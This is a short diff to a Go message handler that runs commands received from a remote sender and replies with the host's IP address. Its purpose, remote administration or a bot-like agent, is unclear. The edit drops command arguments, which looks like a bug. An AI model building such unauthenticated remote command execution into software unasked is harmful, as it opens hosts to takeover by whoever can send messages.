@@ -61,8 +61,8 @@ func input(input, sender string) {
 	if req.Type == "run" {
 		fmt.Println("Running command: " + req.Data)
 
-		command := strings.SplitN(input, " ", 2)
-		cmd := exec.Command(command[0], command[1])
+		command := strings.SplitN(req.Data, " ", 2)
+		cmd := exec.Command(command[0])
 
 		output, err := cmd.Output()
 		if err != nil {
@@ -88,6 +88,10 @@ func input(input, sender string) {
 				send(sender, "\033[32mget\033[0m:\033[34mip\033[0m:\033[31mCan't get IP\033[0m")
 			}
 			send(sender, "\033[32mget\033[0m:\033[34mip\033[0m:\033[33m"+getIP()+"\033[0m")
+			send(sender, "\033[32mget\033[0m:\033[34mdone\033[0m:")
+		} else {
+			fmt.Println("Unknown get request: " + req.Data)
+			send(sender, "\033[32mget\033[0m:\033[34merr\033[0m:Unknown get request: "+req.Data)
 			send(sender, "\033[32mget\033[0m:\033[34mdone\033[0m:")
 		}
 	}
